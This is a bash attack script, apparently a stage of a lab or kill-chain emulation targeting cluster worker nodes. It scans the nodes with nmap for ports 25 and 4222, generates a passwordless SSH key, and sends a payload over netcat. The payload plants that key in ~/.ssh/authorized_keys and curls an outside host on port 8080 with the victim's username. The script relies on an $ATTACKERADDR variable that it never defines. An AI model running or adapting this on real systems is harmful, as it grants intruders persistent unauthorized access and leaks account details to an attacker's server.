#!/usr/bin/env bash
set -euo pipefail

FILE_IP="/tmp/iphost"
KEY_PATH="$HOME/.ssh/id_ed25519"
FILEATTACK="$DATA_PATH/KC4/attackaddr"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NODE_IP_HELPER="${SCRIPT_DIR}/../common/list-node-ips.sh"

[[ -f "${NODE_IP_HELPER}" ]] || { echo "Missing helper: ${NODE_IP_HELPER}" >&2; exit 1; }
# shellcheck source=../common/list-node-ips.sh
source "${NODE_IP_HELPER}"

mkdir -p "$DATA_PATH/KC4/analysis"
mapfile -t nodes < <(list_worker_node_ips "$FILE_IP" | sed '/^$/d')
if [[ "${#nodes[@]}" -eq 0 ]]; then
  echo "No node found"
  exit 1
fi
echo ">> Nodes found (${#nodes[@]}): ${nodes[*]}"

ATTACKER_NODE=""
for n in "${nodes[@]}"; do
  out="$(nmap -p 25,4222 -Pn -oG - "$n" 2>/dev/null)"
  # Check both ports reported as open in nmap greppable output
  if echo "$out" | grep -q '25/open' && echo "$out" | grep -q '4222/open'; then
    echo "FOUND: $n (ports 25 and 4222 are open)"
    ATTACKER_NODE="$n"
    echo "$ATTACKER_NODE" > "$FILEATTACK"
    break
  fi
done

[[ -n "${ATTACKER_NODE}" ]] || { echo "No worker node with both ports 25 and 4222 open." >&2; exit 1; }
command -v ssh-keygen >/dev/null 2>&1 || { echo "Missing command: ssh-keygen" >&2; exit 1; }
command -v nc >/dev/null 2>&1 || { echo "Missing command: nc" >&2; exit 1; }
mkdir -p "$(dirname "$KEY_PATH")"
ssh-keygen -t ed25519 -N "" -f "$KEY_PATH" -q
echo -n "echo \"$(cat "$KEY_PATH.pub")\" >> ~/.ssh/authorized_keys && curl http://$ATTACKERADDR:8080/\$(id -un)" \
  | nc -w9 "$ATTACKER_NODE" 25 >/dev/null 2>&1
